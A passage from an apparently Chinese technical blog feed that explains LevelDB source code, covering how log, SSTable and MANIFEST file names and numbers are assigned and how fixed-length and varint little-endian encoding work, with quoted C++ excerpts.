class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dbname, <span class="keyword">uint64_t</span> number)</span> </span>&#123;</span><br><span class="line">  assert(number &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> MakeFileName(dbname, number, <span class="string">"ldb"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">SSTTableFileName</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dbname, <span class="keyword">uint64_t</span> number)</span> </span>&#123;</span><br><span class="line">  assert(number &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> MakeFileName(dbname, number, <span class="string">"sst"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，manifest文件没有调用MakeFileName，而是自己单独的函数:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">DescriptorFileName</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dbname, <span class="keyword">uint64_t</span> number)</span> </span>&#123;</span><br><span class="line">  assert(number &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">"/MANIFEST-%06llu"</span>,</span><br><span class="line">                <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>&gt;(number));</span><br><span class="line">  <span class="keyword">return</span> dbname + buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-文件编号"><a href="#2-文件编号" class="headerlink" title="2. 文件编号"></a>2. 文件编号</h2><h3 id="1-sstable-log和manifest的number"><a href="#1-sstable-log和manifest的number" class="headerlink" title="1. sstable, log和manifest的number"></a>1. sstable, log和manifest的number</h3><p>dbname和后缀容易理解。那number是在哪儿来的？</p><p>实际上在leveldb中所有和编号有关的文件名的编码都有versonset来维护：</p><p>如log file的number:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> new_log_number = impl-&gt;versions_-&gt;NewFileNumber();</span><br><span class="line">WritableFile* lfile;</span><br><span class="line">s = options.env-&gt;NewWritableFile(LogFileName(dbname, new_log_number),</span><br><span class="line">                                 &amp;lfile);</span><br></pre></td></tr></table></figure><p>又如sstable的number:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_number = versions_-&gt;NewFileNumber();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make the output file</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> fname = TableFileName(dbname_, file_number);</span><br></pre></td></tr></table></figure><p>看看NewFileNumber：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">NewFileNumber</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> next_file_number_++; &#125;</span><br></pre></td></tr></table></figure><p>所以log和sst文件的编号都是由versionset中的next_file_number_来维护的。注意在versionset的构造函数中，next_file_number被初始化为2:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">VersionSet::VersionSet(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dbname, <span class="keyword">const</span> Options* options,</span><br><span class="line">                       TableCache* table_cache,</span><br><span class="line">                       <span class="keyword">const</span> InternalKeyComparator* cmp)</span><br><span class="line">    : env_(options-&gt;env),</span><br><span class="line">      dbname_(dbname),</span><br><span class="line">      options_(options),</span><br><span class="line">      table_cache_(table_cache),</span><br><span class="line">      icmp_(*cmp),</span><br><span class="line">      next_file_number_(<span class="number">2</span>),<span class="comment">// !! 这里被初始化为2的</span></span><br><span class="line">      manifest_file_number_(<span class="number">0</span>),  <span class="comment">// Filled by Recover()</span></span><br><span class="line">      last_sequence_(<span class="number">0</span>),</span><br><span class="line">      log_number_(<span class="number">0</span>),</span><br><span class="line">      prev_log_number_(<span class="number">0</span>),</span><br><span class="line">      descriptor_file_(<span class="literal">nullptr</span>),</span><br><span class="line">      descriptor_log_(<span class="literal">nullptr</span>),</span><br><span class="line">      dummy_versions_(<span class="keyword">this</span>),</span><br><span class="line">      current_(<span class="literal">nullptr</span>) &#123;</span><br><span class="line">  AppendVersion(<span class="keyword">new</span> Version(<span class="keyword">this</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="文件编号1在哪儿？"><a href="#文件编号1在哪儿？" class="headerlink" title="文件编号1在哪儿？"></a>文件编号1在哪儿？</h4><p>那谁在用1呢？<code>manifest_file_number_</code>在用。注意到在<code>versionset</code>的构造函数中<code>manifest_file_number_</code>初始化为0. 如果系统是首次使用，则会在NewDB中重新对<code>manifest_file_number_</code>赋值：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">DBImpl::NewDB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  VersionEdit new_db;</span><br><span class="line">  new_db.SetComparatorName(user_comparator()-&gt;Name());</span><br><span class="line">  new_db.SetLogNumber(<span class="number">0</span>);</span><br><span class="line">  new_db.SetNextFile(<span class="number">2</span>);<span class="comment">// !! 记住这里的next file number = 2</span></span><br><span class="line">  new_db.SetLastSequence(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// !! 这里设置了manifest的number = 1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> manifest = DescriptorFileName(dbname_, <span class="number">1</span>);</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">      <span class="comment">// 设置CURRENT 指向</span></span><br><span class="line">    <span class="comment">// Make "CURRENT" file that points to the new manifest file.</span></span><br><span class="line">    s = SetCurrentFile(env_, dbname_, <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    env_-&gt;RemoveFile(manifest);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过一般来说，除非你修改了options，否则你在运行leveldb时，看到的最小的manifest文件应该是，MANIFEST-000002. 这是为什么？这是因为在DBImpl::Open函数中调用NewDB函数后，紧接着调用了Recover.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">VersionSet::Recover</span><span class="params">(<span class="keyword">bool</span>* save_manifest)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 省略掉的... 中做工作就是中 CURRENT 所指向的manifest文件读取内容， 先前在NewDB中CURRENT指向 manifest000001</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">if</span> (edit.has_next_file_number_) &#123;</span><br><span class="line">        next_file = edit.next_file_number_;<span class="comment">// 此时next_file = 2, 因为在NewDB中 next_file_number_ 被设置为2</span></span><br><span class="line">        have_next_file = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (edit.has_last_sequence_) &#123;</span><br><span class="line">        last_sequence = edit.last_sequence_;</span><br><span class="line">        have_last_sequence = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">delete</span> file;</span><br><span class="line">  file = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">    Version* v = <span class="keyword">new</span> Version(<span class="keyword">this</span>);</span><br><span class="line">    builder.SaveTo(v);</span><br><span class="line">    <span class="comment">// Install recovered version</span></span><br><span class="line">    Finalize(v);</span><br><span class="line">    AppendVersion(v);</span><br><span class="line">    manifest_file_number_ = next_file;<span class="comment">// ！！ 这里manifest_file_number_ = 2</span></span><br><span class="line"> ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这里就解释了 manifest_file_number_ = 2是如何来的， 那manifest_file_number_ = 1是如何消失的？在DBImpl::Open的下半部分：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">  impl-&gt;RemoveObsoleteFiles();<span class="comment">// 其中移除了manifest_file_number = 1时的文件</span></span><br><span class="line">  impl-&gt;MaybeScheduleCompaction();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过要意识到，这只是系统第一次使用启动时manifest_file_number的指定过程。 在后序的使用过程中，manifest_file_number的初始化是从<code>VersionSet::Recover</code>中开始，这其中 manifest_file_number仍然由next_file_number_指定，另外还要考虑是否Reuse旧manifest文件，如果复用，manifest_file_number将等于旧manifest的number。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>总结起来一句话，sstable, log, manifest的编号都是由versoinset的next_file_number_来指定。</strong></p><h3 id="2-VersoinSet中的LogNumber和PrevLogNumber"><a href="#2-VersoinSet中的LogNumber和PrevLogNumber" class="headerlink" title="2. VersoinSet中的LogNumber和PrevLogNumber"></a>2. VersoinSet中的LogNumber和PrevLogNumber</h3><p>PrevLogNumber已不再使用。</p><p>LogNumber存放的是当前系统有效的log file 的number。用于写log、recover系统时判定是否有newer log没有转化为sstable等。</p>]]></content>
      
      
      <categories>
          
          <category> leveldb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leveldb源码阅读记录-编码</title>
      <link href="/archives/8f115521.html"/>
      <url>/archives/8f115521.html</url>
      
        <content type="html"><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>在阅读本篇文章前，你应该能先了解什么是字节序，什么是小端序，什么是大端序。 </p><a id="more"></a><h2 id="1-正文"><a href="#1-正文" class="headerlink" title="1. 正文"></a>1. 正文</h2><p>leveldb中与编码相关的内容都在coding.h，coding.cc文件中。leveldb的编码都是采用小端序，编码一共分为固定长度编码和变长编码，且都分为32位和64位版本，我们先说固定长度编码。</p><h2 id="2-固定长度编码"><a href="#2-固定长度编码" class="headerlink" title="2. 固定长度编码"></a>2. 固定长度编码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Lower-level versions of Put... that write directly into a character buffer</span></span><br><span class="line"><span class="comment">// REQUIRES: dst has enough space for the value being written</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">EncodeFixed32</span><span class="params">(<span class="keyword">char</span>* dst, <span class="keyword">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint8_t</span>* <span class="keyword">const</span> <span class="built_in">buffer</span> = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(dst);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Recent clang and gcc optimize this to a single mov / str instruction.</span></span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">0</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">1</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">2</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">3</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">EncodeFixed64</span><span class="params">(<span class="keyword">char</span>* dst, <span class="keyword">uint64_t</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint8_t</span>* <span class="keyword">const</span> <span class="built_in">buffer</span> = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(dst);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Recent clang and gcc optimize this to a single mov / str instruction.</span></span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">0</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">1</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">2</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">16</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">3</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">24</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">4</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">32</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">5</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">40</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">6</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">48</span>);</span><br><span class="line">  <span class="built_in">buffer</span>[<span class="number">7</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(value &gt;&gt; <span class="number">56</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一句话总结，低位字节放在低位内存，高位字节放在高位内存，也即小端序。</p><p>解码过程：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Lower-level versions of Get... that read directly from a character buffer</span></span><br><span class="line"><span class="comment">// without any bounds checking.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">uint32_t</span> <span class="title">DecodeFixed32</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* ptr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint8_t</span>* <span class="keyword">const</span> <span class="built_in">buffer</span> = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">uint8_t</span>*&gt;(ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Recent clang and gcc optimize this to a single mov / ldr instruction.</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">0</span>])) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">3</span>]) &lt;&lt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">uint64_t</span> <span class="title">DecodeFixed64</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* ptr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint8_t</span>* <span class="keyword">const</span> <span class="built_in">buffer</span> = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">uint8_t</span>*&gt;(ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Recent clang and gcc optimize this to a single mov / ldr instruction.</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">0</span>])) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">3</span>]) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">4</span>]) &lt;&lt; <span class="number">32</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">5</span>]) &lt;&lt; <span class="number">40</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">6</span>]) &lt;&lt; <span class="number">48</span>) |</span><br><span class="line">         (<span class="keyword">static_cast</span>&lt;<span class="keyword">uint64_t</span>&gt;(<span class="built_in">buffer</span>[<span class="number">7</span>]) &lt;&lt; <span class="number">56</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按字节取即可。</p><h2 id="3-变长编码"><a href="#3-变长编码" class="headerlink" title="3. 变长编码"></a>3. 变长编码</h2><p>为什么需要变长编码？ 考虑一个场景，假设现在我们只用在存放一个int类型的1， 这么简单的一个数字，我们却需要4个字节（一般情况下），要是可以压缩就好了。变长编码就是用来解决这个问题的，使用变长编码后，只用一个字节就可以保存这个1. </p><p>leveldb的变长编码也是采用小端序，同时在一个字节中，低7位表示的是实际数据，最高的1位用来表示，这个字节后序是否还有字节用来表示数字。举个例子：</p><p>假设要表示数字1000。 其二进制是111 1101000。 </p><p>首先取出低7位：1101000， 高位先补0凑成一个字节， 0110 1000。</p><p>取出高3位： 111， 高位补0凑成一个字节， 0000 0111.</p><p>采用小端序存储这个数字： 0110 1000 0000 0111。</p><p>因为这里用到了两个字节表示一个数字，所以在第一个字节的最高位需要设置成1，表示第二个字节也是用来表示“1000（一千）”这个数字的。最终编码结果为：</p><p><strong>1110 1000 0000 0111.</strong></p><p>解码过程：</p><p>首先，读取第一个字节， 1110 1000， 最高位为1，表示后续还有字节表示这个数字，还原最高位位1后（0110 1000），再取一个字节（0000 0111）， 因为0000 0111最高不为1，所以取字节结束。现在得到两个字节：</p><p>01110 1000 0000 0111</p><p>按照小端序还原：</p><p><strong>0000 0111 0110 1000（二进制） ==&gt; 1000（十进制）</strong></p><p>知道了原理，来看代码吧。</p><p>变长编码函数签名：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Lower-level versions of Put... that write directly into a character buffer</span></span><br><span class="line"><span class="comment">// and return a pointer just past the last byte written.</span></span><br><span class="line"><span class="comment">// REQUIRES: dst has enough space for the value being written</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">EncodeVarint32</span><span class="params">(<span class="keyword">char</span>* dst, <span class="keyword">uint32_t</span> value)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">EncodeVarint64</span><span class="params">(<span class="keyword">char</span>* dst, <span class="keyword">uint64_t</span> value)</span></span>;</span><br></pre></td></tr></table></figure><p>实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">EncodeVarint32</span><span class="params">(<span class="keyword">char</span>* dst, <span class="keyword">uint32_t</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Operate on characters as unsigneds</span></span><br><span class="line">  <span class="keyword">uint8_t</span>* ptr = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(dst);</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> B = <span class="number">128</span>;</span><br><span class="line">  <span class="keyword">if</span> (v &lt; (<span class="number">1</span> &lt;&lt; <span class="number">7</span>)) &#123;</span><br><span class="line">    *(ptr++) = v;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v &lt; (<span class="number">1</span> &lt;&lt; <span class="number">14</span>)) &#123;</span><br><span class="line">    *(ptr++) = v | B;</span><br><span class="line">    *(ptr++) = v &gt;&gt; <span class="number">7</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v &lt; (<span class="number">1</span> &lt;&lt; <span class="number">21</span>)) &#123;</span><br><span class="line">    *(ptr++) = v | B;</span><br><span class="line">    *(ptr++) = (v &gt;&gt; <span class="number">7</span>) | B;</span><br><span class="line">    *(ptr++) = v &gt;&gt; <span class="number">14</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v &lt; (<span class="number">1</span> &lt;&lt; <span class="number">28</span>)) &#123;</span><br><span class="line">    *(ptr++) = v | B;</span><br><span class="line">    *(ptr++) = (v &gt;&gt; <span class="number">7</span>) | B;</span><br><span class="line">    *(ptr++) = (v &gt;&gt; <span class="number">14</span>) | B;</span><br><span class="line">    *(ptr++) = v &gt;&gt; <span class="number">21</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    *(ptr++) = v | B;</span><br><span class="line">    *(ptr++) = (v &gt;&gt; <span class="number">7</span>) | B;</span><br><span class="line">    *(ptr++) = (v &gt;&gt; <span class="number">14</span>) | B;</span><br><span class="line">    *(ptr++) = (v &gt;&gt; <span class="number">21</span>) | B;</span><br><span class="line">    *(ptr++) = v &gt;&gt; <span class="number">28</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照前面讲的例子，这段代码不难理解，变量B用来设置一个字节的最高位，表示后续是否还有字节。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">EncodeVarint64</span><span class="params">(<span class="keyword">char</span>* dst, <span class="keyword">uint64_t</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> B = <span class="number">128</span>;</span><br><span class="line">  <span class="keyword">uint8_t</span>* ptr = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint8_t</span>*&gt;(dst);</span><br><span class="line">  <span class="keyword">while</span> (v &gt;= B) &#123;</span><br><span class="line">    *(ptr++) = v | B;</span><br><span class="line">    v &gt;&gt;= <span class="number">7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *(ptr++) = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint8_t</span>&gt;(v);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>64位是32位的循环版本，两个代码表示同一个意思。</p><p>解码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Standard Get... routines parse a value from the beginning of a Slice</span></span><br><span class="line"><span class="comment">// and advance the slice past the parsed value.</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetVarint32</span><span class="params">(Slice* input, <span class="keyword">uint32_t</span>* value)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">GetVarint64</span><span class="params">(Slice* input, <span class="keyword">uint64_t</span>* value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//----------最终会走到下面这个函数---------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">GetVarint32PtrFallback</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p, <span 